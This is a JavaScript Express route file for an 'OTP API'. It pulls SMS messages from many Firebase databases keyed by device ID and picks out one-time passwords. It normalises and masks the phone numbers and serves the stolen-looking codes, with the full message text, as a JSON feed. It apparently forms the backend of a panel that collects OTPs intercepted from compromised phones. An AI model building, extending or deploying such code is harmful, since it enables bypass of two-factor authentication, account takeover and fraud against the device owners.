"use strict";

/**
 * OTP API v1 — Array format, no cache, CYRUS masked phones.
 * Format: [[service, phone, raw_sms, timestamp, " country"], ...]
 */

const { Router } = require("express");
const ConnectionsService = require("../services/connections");
const FirebaseService = require("../services/firebase");
const DeviceService = require("../services/devices");
const OtpExtractor = require("../services/otpExtractor");

const router = Router();

const PHONE_PATHS = [
  "phoneNumber", "phone", "number", "mobileNumber", "mobile",
  "phoneNo", "contactNumber", "simNumber", "sim", "registeredNumber",
  "devicePhone", "myNumber", "simPhoneNumber", "line1Number", "msisdn",
  "phone_number", "mobile_number", "cellNumber",
];

function getNestedValue(obj, path) {
  if (!obj) return undefined;
  const parts = path.split(".");
  let cur = obj;
  for (const p of parts) { if (!cur || typeof cur !== "object") return undefined; cur = cur[p]; }
  return cur;
}

function findPhone(device, rawClient) {
  if (device?.phoneNumber && device.phoneNumber !== "—") return device.phoneNumber;
  if (rawClient && typeof rawClient === "object") {
    for (const path of PHONE_PATHS) {
      const val = getNestedValue(rawClient, path);
      if (val && val !== "—" && val !== "" && val !== "null") {
        let d = String(val).replace(/[^0-9]/g, "");
        if (d.length === 11 && d.startsWith("0")) d = d.slice(1);
        if (d.length === 10) return "91" + d;
        if (d.length === 12 && d.startsWith("92")) return "91" + d.slice(2);
        if (d.length >= 11 && d.length <= 15) return d;
      }
    }
    for (const key of Object.keys(rawClient)) {
      const sub = rawClient[key];
      if (sub && typeof sub === "object" && !Array.isArray(sub)) {
        for (const path of PHONE_PATHS) {
          const val = sub[path];
          if (val && val !== "—" && val !== "") {
            let d = String(val).replace(/[^0-9]/g, "");
            if (d.length === 11 && d.startsWith("0")) d = d.slice(1);
            if (d.length === 10) return "91" + d;
            if (d.length === 12 && d.startsWith("92")) return "91" + d.slice(2);
            if (d.length >= 11 && d.length <= 15) return d;
          }
        }
      }
    }
  }
  return "";
}

router.get("/", async (req, res, next) => {
  try {
    const countParam = req.query.count;
    let count;
    if (countParam === "0" || countParam === "all") count = 0;
    else if (countParam) count = Math.min(parseInt(countParam) || 50, 500);
    else count = 50;

    const connections = await ConnectionsService.getAllActive();
    if (!connections.length) return res.json([]);

    const allOtps = [];

    const results = await Promise.allSettled(
      connections.map(async (conn) => {
        try {
          const [clientsData, messagesRoot] = await Promise.all([
            FirebaseService.read(conn.url, conn.key, "clients").catch(() => null),
            FirebaseService.read(conn.url, conn.key, "messages").catch(() => null),
          ]);

          const devices = DeviceService.parseAll(clientsData);
          const connOtps = [];

          if (messagesRoot && typeof messagesRoot === "object") {
            for (const [deviceId, deviceMessages] of Object.entries(messagesRoot)) {
              if (!deviceMessages || typeof deviceMessages !== "object") continue;

              const device = devices.find((d) => d.id === deviceId);
              const rawClient = clientsData?.[deviceId];
              const phone = findPhone(device, rawClient);
              const masked = OtpExtractor.maskPhone(phone);

              for (const [, msg] of Object.entries(deviceMessages)) {
                if (!msg || typeof msg !== "object") continue;
                const text = msg.text || msg.body || msg.message || "";
                if (!OtpExtractor.isOtpMessage(text)) continue;
                const extracted = OtpExtractor.extractOtp(text);
                if (!extracted) continue;

                connOtps.push([
                  extracted.service,
                  masked,
                  text.trim(),
                  getTimestamp(msg),
                  " " + OtpExtractor.detectCountry(phone),
                ]);
              }
            }
          }
          return connOtps;
        } catch { return []; }
      })
    );

    for (const r of results) {
      if (r.status === "fulfilled") allOtps.push(...r.value);
    }

    allOtps.sort((a, b) => (new Date(b[3]).getTime() || 0) - (new Date(a[3]).getTime() || 0));
    res.json(count > 0 ? allOtps.slice(0, count) : allOtps);
  } catch (err) { next(err); }
});

router.get("/stats", async (req, res) => {
  const connections = await ConnectionsService.getAllActive();
  res.json({ activeConnections: connections.length, cachedOtps: 0, cacheAgeSeconds: 0, cacheTtlSeconds: 0 });
});

function getTimestamp(msg) {
  const raw = msg.timestamp || msg.time || msg.date || msg.receivedAt || msg.createdAt || msg.sentAt || msg.ts || "";
  if (!raw) return fmtDate(new Date());
  if (typeof raw === "number") return fmtDate(new Date(raw > 1e12 ? raw : raw * 1000));
  const d = new Date(raw);
  if (!isNaN(d.getTime())) return fmtDate(d);
  if (typeof raw === "string" && /\d{4}[-/]\d{2}[-/]\d{2}/.test(raw)) return raw.replace(/\//g, "-").slice(0, 19);
  return fmtDate(new Date());
}

function fmtDate(d) {
  const p = (n) => String(n).padStart(2, "0");
  return `${d.getUTCFullYear()}-${p(d.getUTCMonth()+1)}-${p(d.getUTCDate())} ${p(d.getUTCHours())}:${p(d.getUTCMinutes())}:${p(d.getUTCSeconds())}`;
}

module.exports = router;
